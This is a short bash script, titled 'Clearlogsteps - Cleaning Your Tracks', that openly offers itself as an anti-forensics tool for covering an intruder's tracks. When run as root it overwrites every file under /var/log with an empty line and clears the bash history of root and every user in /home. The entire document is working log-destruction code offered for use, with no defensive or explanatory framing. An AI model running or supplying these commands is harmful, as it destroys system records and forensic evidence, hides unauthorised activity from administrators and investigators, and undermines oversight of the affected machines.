#!/bin/bash
printf "====================================================================\r\n"
printf "=              Clearlogsteps - Cleaning Your Tracks...             =\r\n"
printf "=            Author ax3T43r aka COB74(ALAGIE TRAWALLY)             =\r\n"
printf "= This Script Needs Root Privileges To Completely Wipe Your Tracks =\r\n"
printf "====================================================================\r\n\r\n"

printf "[+] Cleaning Logs...\r\n"
mapfile -t logfiles < <(find /var/log -type f)
numlogfiles=${#logfiles[@]}
for ((b=0; b<${numlogfiles};b++));
do
	echo "" > ${logfiles[$b]}
done

printf "[+] Cleaning Bash Histories...\r\n"
mapfile -t users < <(ls /home)
numusers=${#users[@]}
for ((i=0; i<${numusers};i++));
do
	echo "" > /home/${users[$i]}/.bash_history
done

echo "" > /root/.bash_history

printf "[+] All Your Tracks Have Been Cleaned If You Ran This As Root!\r\n"
